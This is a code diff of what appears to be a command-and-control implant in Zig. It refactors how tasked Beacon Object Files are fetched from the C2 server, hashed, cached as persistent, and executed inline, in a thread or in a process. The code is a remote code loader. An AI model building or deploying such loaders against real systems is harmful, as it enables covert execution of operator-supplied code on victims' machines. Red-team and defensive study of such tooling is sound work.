@@ -139,45 +139,47 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     } else null;
     defer if (bof_args) |args| allocator.free(args);
 
-    // process header
+    // process header { exec_mode, args_spec, hash, [persistence] }
+    //
     const bof_header = root.object.get("header").?.string;
     var bof_header_iter = std.mem.splitScalar(u8, bof_header, ':');
 
+    // get hint regarding execution mode
     const exec_mode = bof_header_iter.next() orelse return error.BadData;
+
+    // get arguments specification string
     const args_spec = bof_header_iter.next() orelse return error.BadData;
     _ = args_spec;
 
+    // get BOF's hash
+    const hash = try std.fmt.parseInt(u64, bof_header_iter.next() orelse return error.BadData, 16);
+    std.log.info("Received hash: 0x{x}", .{hash});
+
+    // keep BOF in memory after running it?
     const is_persistent = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "persist") else false;
 
     // TODO: handle 'buffers'
 
-    const bof_path = root.object.get("path").?.string;
+    var is_loaded: bool = false;
+    var bof_to_exec: bof.Object = undefined;
+    if (state.persistent_bofs.get(hash)) |b| {
+        std.log.info("Re-using existing persistent BOF (hash: 0x{x})", .{hash});
+        bof_to_exec = b;
+        is_loaded = true;
+    } else {
+        // we need to fetch BOF file content from C2 sever
+        const bof_path = root.object.get("path").?.string;
+        const bof_content = try fetchBofContent(allocator, state, bof_path);
+        defer allocator.free(bof_content);
 
-    // fetch bof content
-    const bof_content = try fetchBofContent(allocator, state, bof_path);
-    defer allocator.free(bof_content);
+        bof_to_exec = try bof.Object.initFromMemory(bof_content);
+        errdefer bof_to_exec.release();
 
-    const bof_object = if (is_persistent) blk: {
-        const hash = std.hash.XxHash64.hash(123, bof_content);
-
-        if (state.persistent_bofs.get(hash)) |existing_bof| {
-            std.log.info("Re-using existing persistent BOF (hash: 0x{x})", .{hash});
-            break :blk existing_bof;
+        if (is_persistent) {
+            try state.persistent_bofs.put(hash, bof_to_exec);
+            std.log.info("Loaded new persistent BOF (hash: 0x{x})", .{hash});
         }
-
-        const new_bof = try bof.Object.initFromMemory(bof_content);
-        errdefer new_bof.release();
-
-        try state.persistent_bofs.put(hash, new_bof);
-
-        std.log.info("Loaded new persistent BOF (hash: 0x{x})", .{hash});
-        break :blk new_bof;
-    } else blk: {
-        const new_bof = try bof.Object.initFromMemory(bof_content);
-        std.log.info("Loaded new non-persistent BOF", .{});
-        break :blk new_bof;
-    };
-    errdefer if (!is_persistent) bof_object.release();
+    }
 
     var bof_context: ?*bof.Context = null;
     errdefer if (bof_context) |context| context.release();
@@ -185,11 +187,11 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     if (std.mem.eql(u8, exec_mode, "inline")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
 
-        bof_context = try bof_object.run(@constCast(bof_args));
+        bof_context = try bof_to_exec.run(@constCast(bof_args));
     } else if (std.mem.eql(u8, exec_mode, "thread")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
 
-        bof_context = try bof_object.runAsyncThread(
+        bof_context = try bof_to_exec.runAsyncThread(
             @constCast(bof_args),
             null,
             null,
@@ -197,7 +199,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     } else if (std.mem.eql(u8, exec_mode, "process")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
 
-        bof_context = try bof_object.runAsyncProcess(
+        bof_context = try bof_to_exec.runAsyncProcess(
             @constCast(bof_args),
             null,
             null,
@@ -255,6 +257,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
         const cmd_prefix = iter_task.next() orelse return error.BadData;
         const cmd_name = iter_task.next() orelse return error.BadData;
 
+        // tasked for BOF execution?
         if (std.mem.eql(u8, cmd_prefix, "bof")) {
             std.log.info("Executing bof: {s}", .{cmd_name});
 
@@ -265,6 +268,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
                     .launcher_error_code = @abs(@intFromError(err)) - 1000,
                 });
             };
+            // tasked for custom command execution?
         } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
             std.log.info("Executing builtin command: {s}", .{cmd_name});
 
